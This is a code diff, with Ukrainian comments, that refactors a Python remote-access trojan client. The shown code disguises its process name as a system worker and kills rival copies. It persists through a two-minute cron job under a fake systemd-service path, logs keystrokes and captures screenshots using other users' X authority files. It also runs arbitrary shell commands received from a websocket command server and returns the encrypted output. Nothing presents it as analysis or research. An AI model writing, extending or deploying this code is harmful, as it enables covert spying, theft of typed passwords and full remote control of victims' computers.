@@ -13,6 +13,7 @@ import signal
 import getpass
 from io import BytesIO
 
+# Динамічний імпорт модулів
 try: import setproctitle
 except: setproctitle = None
 try: from PIL import ImageGrab
@@ -45,7 +46,7 @@ def encrypt(m):
     return base64.b64encode(crypt_logic(m).encode()).decode()
 
 def masquerade():
-    """Зміна імені процесу для маскування під системний воркер"""
+    """Маскування під системний процес ядра"""
     if setproctitle: 
         setproctitle.setproctitle(FAKE_NAME)
     else:
@@ -56,57 +57,56 @@ def masquerade():
         except: pass
 
 def kill_others():
-    """Хірургічне видалення старих копій, уникаючи вбивства власної сесії"""
+    """Хірургічне очищення конкурентів. Ігнорує власну сесію та батьківський процес."""
     my_pid = os.getpid()
-    parent_pid = os.getppid() # Твій SSH/Bash сеанс
+    parent_pid = os.getppid() 
     try:
-        # Шукаємо тільки процеси, які вже мають змінену назву
-        p = subprocess.run(['ps', '-eo', 'pid,comm'], capture_output=True, text=True)
+        p = subprocess.run(['ps', '-eo', 'pid,comm,args'], capture_output=True, text=True)
         for line in p.stdout.splitlines():
             if FAKE_NAME in line or "client.py" in line:
                 parts = line.strip().split()
                 if not parts: continue
                 pid = int(parts[0])
-                # Вбиваємо ТІЛЬКИ якщо це не ми і не наш "батько"
+                # Вбиваємо тільки якщо це не ми, не наш бінарник в SSH і не оболонка
                 if pid != my_pid and pid != parent_pid:
                     try: os.kill(pid, signal.SIGKILL)
                     except: pass
     except: pass
 
+def is_singleton():
+    """Запобігає запуску дублів через абстрактні сокети"""
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.bind('\0amy_2026_singleton_lock')
+        return s
+    except socket.error:
+        return None
+
 def ghost_install():
+    """Закріплення в cron з очищенням старих записів"""
     try:
         p = os.path.expanduser("~/.local/share/systemd-service")
         os.makedirs(p, exist_ok=True)
-        t = os.path.join(p, "sys-update")
+        target = os.path.join(p, "sys-update")
         
-        if not os.path.exists(t) or os.path.getsize(sys.argv[0]) != os.path.getsize(t):
-            shutil.copy2(sys.argv[0], t)
-            os.chmod(t, 0o755)
+        # Копіюємо бінарник або скрипт
+        if not os.path.exists(target) or os.path.getsize(sys.argv[0]) != os.path.getsize(target):
+            shutil.copy2(sys.argv[0], target)
+            os.chmod(target, 0o755)
         
-        cron_job = f"*/2 * * * * {t} >/dev/null 2>&1"
+        cron_job = f"*/2 * * * * {target} >/dev/null 2>&1"
         current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
-        if t not in current_cron:
-            clean_cron = "\n".join([l for l in current_cron.splitlines() if "sys-update" not in l])
-            subprocess.run(f'(echo "{clean_cron}"; echo "{cron_job}") | crontab -', shell=True)
+        if target not in current_cron:
+            # Очищуємо старі записи AMY і додаємо новий
+            clean_lines = [l for l in current_cron.splitlines() if "sys-update" not in l and l.strip()]
+            clean_lines.append(cron_job)
+            new_cron = "\n".join(clean_lines) + "\n"
+            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
+            proc.communicate(input=new_cron.encode())
     except: pass
 
-def take_screenshot_sync():
-    if not ImageGrab: return None
-    try:
-        if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
-        if os.getuid() == 0:
-            for path in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
-                if os.path.exists(path):
-                    os.environ['XAUTHORITY'] = path
-                    break
-        
-        screenshot = ImageGrab.grab()
-        buf = io.BytesIO()
-        screenshot.save(buf, format="PNG")
-        return base64.b64encode(buf.getvalue()).decode()
-    except: return None
-
 async def run_shell(cmd):
+    """Виконує команду з чистим виводом та відновленим PATH"""
     try:
         env = os.environ.copy()
         env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
@@ -114,19 +114,32 @@ async def run_shell(cmd):
         proc = await asyncio.create_subprocess_shell(
             cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
         )
-        o, e = await proc.communicate()
-        res = o.decode() + e.decode()
-        
-        user = getpass.getuser() # Безпечна заміна os.getlogin()
-        cwd = os.getcwd()
-        return f"{user}@{socket.gethostname()}:{cwd}$ \n{res}"
+        stdout, stderr = await proc.communicate()
+        res = stdout.decode().strip() + stderr.decode().strip()
+        return res if res else "(команда виконана)"
     except Exception as ex:
-        return f"Error: {str(ex)}"
+        return f"Shell Error: {str(ex)}"
+
+def take_screenshot_sync():
+    """Захоплення екрана з підтримкою X11 та root"""
+    if not ImageGrab: return None
+    try:
+        if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
+        # Пошук прав доступу до дисплея
+        for p in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
+            if os.path.exists(p):
+                os.environ['XAUTHORITY'] = p
+                break
+        
+        buf = io.BytesIO()
+        ImageGrab.grab().save(buf, format="PNG")
+        return base64.b64encode(buf.getvalue()).decode()
+    except: return None
 
 async def keylog_sender(ws):
     global log_buffer
     while True:
-        await asyncio.sleep(20)
+        await asyncio.sleep(30)
         if log_buffer:
             try:
                 await ws.send(encrypt(f"LOGS:{''.join(log_buffer)}"))
@@ -141,26 +154,29 @@ def on_press(key):
         else: log_buffer.append(f"[{key.name}]")
 
 async def start():
-    # 1. Хірургічна чистка
+    # 1. Singleton check
+    lock = is_singleton()
+    if not lock: sys.exit(0)
+
+    # 2. Очищення та підготовка
     kill_others()
-    # 2. Маскування
     masquerade()
-    # 3. Закріплення
     ghost_install()
     
+    # 3. Кейлоггер
     if keyboard:
         try:
             listener = keyboard.Listener(on_press=on_press)
             listener.start()
         except: pass
 
-    # Статичний ID
+    # 4. Статичний HWID
     b_id = hex(uuid.getnode())[2:10]
     
     while True:
         try:
             url = get_url()
-            async with websockets.connect(url + b_id, ping_interval=None) as ws:
+            async with websockets.connect(url + b_id, ping_interval=20) as ws:
                 asyncio.create_task(keylog_sender(ws))
                 while True:
                     m = await ws.recv()
@@ -169,13 +185,14 @@ async def start():
                     cmd = cmd.strip()
                     
                     if cmd == "screenshot":
-                        shot_b64 = await asyncio.to_thread(take_screenshot_sync)
-                        if shot_b64: await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
-                        else: await ws.send(encrypt("SYS_MSG: Screenshot failed"))
+                        shot = await asyncio.to_thread(take_screenshot_sync)
+                        if shot: await ws.send(encrypt(f"SCREENSHOT:{shot}"))
+                        else: await ws.send(encrypt("SYS_MSG: Screen error"))
                             
                     elif cmd == "self_destruct":
                         subprocess.run("crontab -r", shell=True)
                         os._exit(0)
+                        
                     else:
                         response = await run_shell(cmd)
                         await ws.send(encrypt(response))
